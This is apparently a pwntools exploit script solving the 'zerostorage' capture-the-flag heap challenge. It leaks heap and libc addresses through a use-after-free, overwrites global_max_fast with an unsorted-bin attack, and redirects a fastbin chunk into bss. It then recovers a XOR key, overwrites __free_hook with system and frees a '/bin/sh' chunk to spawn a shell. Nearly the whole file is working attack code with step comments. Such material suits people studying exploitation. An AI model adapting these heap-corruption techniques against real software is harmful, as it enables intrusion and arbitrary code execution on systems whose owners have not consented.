from pwn import *

debug = 1

if debug:
	#context.log_level = "true"
	p = process('./zerostorage')
else:
	pass

def insert(len, data = ''):
	p.recvuntil("Your choice: ")
	p.sendline('1')
	p.recvuntil("Length of new entry: ")
	p.sendline(str(len))
	p.recvuntil("Enter your data: ")
	data = data.ljust(len, 'a')
        #print data
	p.send(data)

def update(index, nlen, data):
	p.recvuntil("Your choice: ")
	p.sendline('2')
	p.recvuntil("Entry ID: ")
	p.sendline(str(index))
	p.recvuntil("Length of entry: ")
	p.sendline(str(nlen))
	p.recvuntil("Enter your data: ")
	p.send(data)

def merge(index1, index2):
	p.recvuntil("Your choice: ")
	p.sendline('3')
	p.recvuntil("Merge from Entry ID: ")
	p.sendline(str(index1))
	p.recvuntil("Merge to Entry ID: ")
	p.sendline(str(index2))

def delete(index):
	p.recvuntil("Your choice: ")
	p.sendline('4')
	p.recvuntil("Entry ID: ")
	p.sendline(str(index))

def view(index):
	p.recvuntil("Your choice: ")
	p.sendline('5')
	p.recvuntil("Entry ID: ")
	p.sendline(str(index))
	p.recvline()
	addr1 = u64( p.recv(8) )
	addr2 = u64( p.recv(8) )
	return (addr1, addr2)


insert(8) #0   at leat 8, because the view function outputs the addresses
insert(8, '/bin/sh\x00') #0, 1
insert(8) #0, 1, 2
insert(8) #0, 1, 2, 3 in case consolidating with top chunk
insert(8) #0, 1, 2, 3, 4  becuse of merge(3, 3)
insert(0x90) #0, 1, 2, 3, 4, 5  #prepare for later fastbin unlink attack. checking the size to malloc the fastbin whether is 0x90
delete(0) #1, 2, 3, 4, 5

merge(2, 2) #0, 1, 3, 4, 5

#raw_input("go")

heap_addr, unsorted_bin_addr = view(0)   #use afrer free to read the content of the chunk
print "\n[*]unsorted_bin_addr: " + hex(unsorted_bin_addr)
print "[*]heap_addr: " + hex(heap_addr)

#raw_input("go?")
libc_base_addr = unsorted_bin_addr - 0x3BE7B8 #find main_arena's address in free(libc.so)(__libc_free)
print "[*]libc_base_addr: " + hex(libc_base_addr)

#system's address
system_addr = libc_base_addr + 0x46590
print "[*]system_addr: " + hex(system_addr)

#global_max_fast's address
global_max_fast_addr = libc_base_addr + 0x3C0B40  #find in free-->_int_free
print "[*]global_max_fast_addr: " + hex(global_max_fast_addr)

#__free_hook's address
free_hook_addr = libc_base_addr + 0x3C0A10
print "[*]free_hook_addr: " + hex(free_hook_addr)


#and now the problem is how to get the address of executeble file.
pie_addr = libc_base_addr + 0x5EA000  #offset2libc
print "[*]PIE_addr: " + hex(pie_addr)

bss_addr = pie_addr + 0x203020
print "[*]bss_addr: " + hex(bss_addr)
#raw_input("go")

#now let's overwrite the global_max_fast using unsorted bin attack
insert(8) #0, 1, 2, 3, 4, 5  #becuse of fastbin's FIRST IN FIRST OUT, so we must malloc the first one chunk in unsorted bin
update( 0, 16, 'a' * 8 + p64(global_max_fast_addr - 0x10) )
insert(8) #0, 1, 2, 3, 4, 5, 6
#raw_input("\n[*]Finished overwrite global_max_fast. Go?\n")

#now let's take a fastbin unlink attack
merge(3, 3) #0, 1, 2, 4, 5, 6, 7  #first link into fastbin and causing uaf
update(7, 8, p64(bss_addr + 0x40 + 24 * 5) )
insert(8) #0, 1, 2, 3, 4, 5, 6, 7
insert(80) #0, 1, 2, 3, 4, 5, 6, 7, 8, no.8-->bss,also array no.5

#next is to get the key
p.recvuntil("Your choice: ")
p.sendline('5')
p.recvuntil("Entry ID: ")
p.sendline('8')
p.recvuntil("Entry No.8:\n")
r = p.recv(80)
key = u64(r[-8:]) ^ (bss_addr + 0x40 + 24 *5 + 16)
print "[*]key: " + hex(key)
#raw_input("\n[*]Get key. Go?\n")

#overwrite __free_hook with system
update( 8, 32, p64(0xdeadbeef) + p64(1) + p64(8) + p64(free_hook_addr ^ key) ) #edit no.6 's pointer 
#raw_input("\n[*]replaced no.6's pointer!go?")

#trigger free to call system
update( 6, 8, p64(system_addr) )
delete(1)

print "[*]Get a shell!\n"

p.interactive()





